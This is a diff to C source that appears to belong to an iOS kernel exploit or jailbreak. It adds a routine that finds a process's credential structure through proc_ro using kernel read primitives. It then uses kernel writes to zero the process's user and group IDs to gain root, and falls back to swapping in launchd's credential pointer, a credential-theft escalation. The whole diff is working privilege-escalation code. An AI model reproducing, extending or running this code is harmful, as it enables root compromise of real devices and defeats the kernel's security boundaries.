@@ -273,6 +273,36 @@ static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
     return 0;
 }
 
+static uint64_t find_ucred_from_proc_ro_with_slot(uint64_t proc, uint32_t *slotOut) {
+    uint64_t procRoRaw = ds_kread64(proc + PROC_PROC_RO_OFFSET);
+    uint64_t procRo = normalize_kernel_ptr(procRoRaw);
+    if (!is_kptr(procRo)) {
+        return 0;
+    }
+
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = ds_kread64(procRo + off);
+        uint64_t candidates[3] = {
+            normalize_kernel_ptr(raw),
+            normalize_kernel_ptr(raw & 0x00FFFFFFFFFFFFFFULL),
+            normalize_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
+        };
+
+        for (size_t i = 0; i < 3; i++) {
+            uint64_t cand = candidates[i];
+            if (!is_kptr(cand)) continue;
+
+            uint64_t label = normalize_kernel_ptr(ds_kread64(cand + UCRED_CR_LABEL_OFFSET));
+            if (!is_kptr(label)) continue;
+
+            if (slotOut) *slotOut = off;
+            return cand;
+        }
+    }
+
+    return 0;
+}
+
 static uint32_t find_task_offset(uint64_t proc) {
     uint64_t procsize = procsize_or_default();
     uint64_t candidate = normalize_kernel_ptr(ds_kread64(proc + procsize));
@@ -389,6 +419,7 @@ static int prepareIOKitAccess(void) {
         ucredOff = find_ucred_offset(self);
     }
     uint64_t ucred = 0;
+    uint32_t selfProcRoUcredSlot = 0;
     if (ucredOff) {
         kernel_logf("prepareIOKitAccess: ucred offset = 0x%x", ucredOff);
         ucred = normalize_kernel_ptr(ds_kread64(self + ucredOff));
@@ -397,7 +428,10 @@ static int prepareIOKitAccess(void) {
     }
 
     if (!is_kptr(ucred)) {
-        ucred = find_ucred_from_proc_ro(self);
+        ucred = find_ucred_from_proc_ro_with_slot(self, &selfProcRoUcredSlot);
+        if (is_kptr(ucred) && selfProcRoUcredSlot) {
+            kernel_logf("prepareIOKitAccess: using proc_ro ucred pointer at +0x%x", selfProcRoUcredSlot);
+        }
     }
 
     if (!is_kptr(ucred)) {
@@ -438,18 +472,39 @@ static int prepareIOKitAccess(void) {
 
     bool hadNonCriticalFailures = false;
 
+    bool uidPairOk = kwrite64_retry(ucred + 0x18, 0, 8);
+    bool ruidPairOk = kwrite64_retry(ucred + 0x20, 0, 8);
+
     // Patch uid/gid pairs with aligned 64-bit writes for better primitive reliability.
-    if (!kwrite64_retry(ucred + 0x18, 0, 8)) {
+    if (!uidPairOk) {
         kernel_logf("prepareIOKitAccess: cr_uid/cr_gid pair verify failed (non-critical)");
         hadNonCriticalFailures = true;
     }
-    if (!kwrite64_retry(ucred + 0x20, 0, 8)) {
+    if (!ruidPairOk) {
         kernel_logf("prepareIOKitAccess: cr_ruid/cr_rgid pair verify failed (non-critical)");
         hadNonCriticalFailures = true;
     }
 
-    if (!hadNonCriticalFailures) {
+    if ((!uidPairOk || !ruidPairOk) && selfProcRoUcredSlot) {
+        uint64_t launchdProc = procbypid(1);
+        uint64_t launchdUcred = find_ucred_from_proc_ro_with_slot(launchdProc, NULL);
+        uint64_t selfProcRo = normalize_kernel_ptr(ds_kread64(self + PROC_PROC_RO_OFFSET));
+
+        if (is_kptr(selfProcRo) && is_kptr(launchdUcred)) {
+            if (kwrite64_retry(selfProcRo + selfProcRoUcredSlot, launchdUcred, 4)) {
+                kernel_logf("prepareIOKitAccess: swapped proc_ro ucred pointer with launchd ucred");
+                uidPairOk = true;
+                ruidPairOk = true;
+            } else {
+                kernel_logf("prepareIOKitAccess: proc_ro ucred swap failed (non-critical)");
+            }
+        }
+    }
+
+    if (uidPairOk && ruidPairOk) {
         kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
+    } else {
+        hadNonCriticalFailures = true;
     }
 
     // Do not write to cr_label (ucred+0x78) here: the current kwrite primitive can perform
